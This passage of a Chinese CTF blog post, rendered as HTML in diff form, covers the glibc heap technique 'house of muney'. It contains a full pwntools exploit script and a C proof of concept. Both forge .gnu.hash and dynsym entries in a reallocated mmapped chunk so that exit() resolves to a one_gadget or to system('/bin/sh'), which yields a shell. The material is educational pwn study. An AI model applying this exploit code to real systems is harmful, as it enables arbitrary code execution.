+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"> <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;option:&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;ID:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"> <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;size:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"> <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;option:&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;remove:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"> <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;option:&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;update:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"> <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;length:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"> <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;details:&#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"> <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;option:&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;view:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl"> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x40000</span> <span class="o">-</span> <span class="mh">0x2000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#dbg()</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x41002</span> <span class="o">+</span> <span class="mh">0x5000</span> <span class="o">+</span> <span class="mh">0x4000</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x41000</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mh">0x4000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">base_off</span> <span class="o">=</span> <span class="mh">0x7dff0</span>
+</span></span><span class="line"><span class="cl"><span class="n">one_gadget</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xe3afe</span><span class="p">,</span> <span class="mh">0xe3b01</span><span class="p">,</span> <span class="mh">0xe3b04</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">gnu_hash_section</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.gnu.hash&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">dynsym_section</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.dynsym&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">dynstr_section</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.dynstr&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">namehash</span> <span class="o">=</span> <span class="n">gnu_hash_section</span><span class="o">.</span><span class="n">gnu_hash</span><span class="p">(</span><span class="s1">&#39;exit&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># gnu_hash_section[&#39;sh_addr&#39;]获得gun.hash偏移。</span>
+</span></span><span class="line"><span class="cl"><span class="n">bloom_off</span> <span class="o">=</span> <span class="n">gnu_hash_section</span><span class="p">[</span><span class="s1">&#39;sh_addr&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">gnu_hash_section</span><span class="o">.</span><span class="n">_wordsize</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bucket_off</span> <span class="o">=</span> <span class="n">bloom_off</span> <span class="o">+</span> <span class="n">gnu_hash_section</span><span class="o">.</span><span class="n">params</span><span class="p">[</span><span class="s1">&#39;bloom_size&#39;</span><span class="p">]</span> <span class="o">*</span> <span class="n">gnu_hash_section</span><span class="o">.</span><span class="n">_xwordsize</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bloom_elem_idx</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">namehash</span> <span class="o">/</span> <span class="n">gnu_hash_section</span><span class="o">.</span><span class="n">elffile</span><span class="o">.</span><span class="n">elfclass</span><span class="p">)</span> <span class="o">%</span> <span class="n">gnu_hash_section</span><span class="o">.</span><span class="n">params</span><span class="p">[</span><span class="s1">&#39;bloom_size&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bloom_elem_off</span> <span class="o">=</span> <span class="n">bloom_off</span> <span class="o">+</span> <span class="n">bloom_elem_idx</span> <span class="o">*</span> <span class="n">gnu_hash_section</span><span class="o">.</span><span class="n">_xwordsize</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bloom_elem_val</span> <span class="o">=</span> <span class="n">gnu_hash_section</span><span class="o">.</span><span class="n">params</span><span class="p">[</span><span class="s1">&#39;bloom&#39;</span><span class="p">][</span><span class="n">bloom_elem_idx</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bucket_elem_idx</span> <span class="o">=</span> <span class="n">namehash</span> <span class="o">%</span> <span class="n">gnu_hash_section</span><span class="o">.</span><span class="n">params</span><span class="p">[</span><span class="s1">&#39;nbuckets&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bucket_elem_off</span> <span class="o">=</span> <span class="n">bucket_off</span> <span class="o">+</span> <span class="n">bucket_elem_idx</span> <span class="o">*</span> <span class="n">gnu_hash_section</span><span class="o">.</span><span class="n">_wordsize</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bucket_elem_val</span> <span class="o">=</span> <span class="n">gnu_hash_section</span><span class="o">.</span><span class="n">params</span><span class="p">[</span><span class="s1">&#39;buckets&#39;</span><span class="p">][</span><span class="n">bucket_elem_idx</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">hasharr_off</span> <span class="o">=</span> <span class="n">gnu_hash_section</span><span class="o">.</span><span class="n">_chain_pos</span> <span class="o">+</span> <span class="p">(</span><span class="n">bucket_elem_val</span> <span class="o">-</span> <span class="n">gnu_hash_section</span><span class="o">.</span><span class="n">params</span><span class="p">[</span><span class="s1">&#39;symoffset&#39;</span><span class="p">])</span> <span class="o">*</span> <span class="n">gnu_hash_section</span><span class="o">.</span><span class="n">_wordsize</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sym_off</span> <span class="o">=</span> <span class="n">dynsym_section</span><span class="p">[</span><span class="s1">&#39;sh_offset&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">bucket_elem_val</span> <span class="o">*</span> <span class="n">dynsym_section</span><span class="p">[</span><span class="s1">&#39;sh_entsize&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">sym_value</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">sym_value</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;exit</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="fm">__next__</span><span class="p">()</span> <span class="o">-</span> <span class="n">dynstr_section</span><span class="p">[</span><span class="s1">&#39;sh_offset&#39;</span><span class="p">])</span> <span class="c1"># st_name</span>
+</span></span><span class="line"><span class="cl"><span class="n">sym_value</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x12</span><span class="p">)</span> <span class="c1"># st_info 高4位：0x1 表示 STB_GLOBAL（全局符号）低4位：0x2 表示 STT_FUNC（函数类型）</span>
+</span></span><span class="line"><span class="cl"><span class="n">sym_value</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># st_other 通常为0</span>
+</span></span><span class="line"><span class="cl"><span class="n">sym_value</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># st_shndx 1表示在代码节中</span>
+</span></span><span class="line"><span class="cl"><span class="n">sym_value</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span> <span class="c1"># st_value</span>
+</span></span><span class="line"><span class="cl"><span class="n">sym_value</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span> <span class="c1"># st_size  随意设置,动态链接器通常不验证此字段</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#dbg()</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_off</span> <span class="o">+</span> <span class="n">bloom_elem_off</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">bloom_elem_val</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_off</span> <span class="o">+</span> <span class="n">bucket_elem_off</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">bucket_elem_val</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_off</span> <span class="o">+</span> <span class="n">hasharr_off</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">namehash</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_off</span> <span class="o">+</span> <span class="n">sym_off</span><span class="p">,</span> <span class="n">sym_value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#gdb.attach(io, &#34;b _dl_fixup\nc&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;option:&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;5&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div>
+
+<h4 class="relative group">POC 
+    <div id="poc" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#poc" aria-label="锚点">#</a>
+    </span>        
+    
+</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">strptr</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="mh">0xdeadb000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="n">strptr</span><span class="p">,</span> <span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] step1: allocate a chunk ---&gt; void* ptr = malloc(0x40000);&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x40000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">sz</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] ptr address: %p, chunk size: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">sz</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] step2: change the size of the chunk ---&gt; ptr[-1] += 0x5000;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ptr</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+=</span> <span class="mh">0x5000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] step3: free ptr and steal heap from glibc ---&gt; free(ptr);&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] step4: retrieve heap ---&gt; ptr = malloc(0x41000 * 2);&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ptr</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x41000</span> <span class="o">*</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">sz</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] ptr address: %p, chunk size: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">sz</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 当前ptr到原有libc基地址的偏移
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">size_t</span> <span class="n">base_off</span> <span class="o">=</span> <span class="mh">0x7dff0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 以下地址均是相对于libc基地址的偏移
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">size_t</span> <span class="n">system_off</span> <span class="o">=</span> <span class="mh">0x52290</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">bitmask_word_off</span> <span class="o">=</span> <span class="mh">0xb88</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">bucket_off</span> <span class="o">=</span> <span class="mh">0xcb0</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">exit_sym_st_value_off</span> <span class="o">=</span> <span class="mh">0x4d20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">hasharr_off</span> <span class="o">=</span> <span class="mh">0x1d7c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] step5: set essential data for dl_runtime_resolve&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">base_off</span> <span class="o">+</span> <span class="n">bitmask_word_off</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xf000028c0200130eul</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] set bitmask_word to 0xf000028c0200130eul&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">base_off</span> <span class="o">+</span> <span class="n">bucket_off</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x86u</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] set bucket to 0x86u&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">base_off</span> <span class="o">+</span> <span class="n">exit_sym_st_value_off</span><span class="p">)</span> <span class="o">=</span> <span class="n">system_off</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] set exit@sym.st_value to system_off 0x52290&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">base_off</span> <span class="o">+</span> <span class="n">exit_sym_st_value_off</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xf001200002efbul</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] set other exit@sym members&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">base_off</span> <span class="o">+</span> <span class="n">hasharr_off</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x7c967e3e7c93f2a0ul</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] set hasharr to 0x7c967e3e7c93f2a0ul&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] step6: get shell ---&gt; exit(</span><span class="se">\&#34;</span><span class="s">/bin/sh</span><span class="se">\&#34;</span><span class="s">)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="n">strptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div>
+          
+          
+          
+        </div>
+        
+        
+
+        
+        
+
+          
+      </div>
+     
+      
+      
+        
+        
+          
+          
+        
+      <script>
+        var oid = "views_posts\\Pwn\\Heap\\House of 系列\\house of muney.md"
+        var oid_likes = "likes_posts\\Pwn\\Heap\\House of 系列\\house of muney.md"
+      </script>
+      
+      
+      <script type="text/javascript" src="/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js" integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q&#43;oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script>
+      
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/posts/pwn/heap/house-of-%E7%B3%BB%E5%88%97/house-of-botcake/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >House of系列</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2025-05-21T00:00:00&#43;00:00">2025 年 6 月 21 日</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+    
+    
+    
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="返回顶部" title="返回顶部">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      &copy;
+      2025
+      Tea
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      由 <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a> 强力驱动
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="http://localhost:1313/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
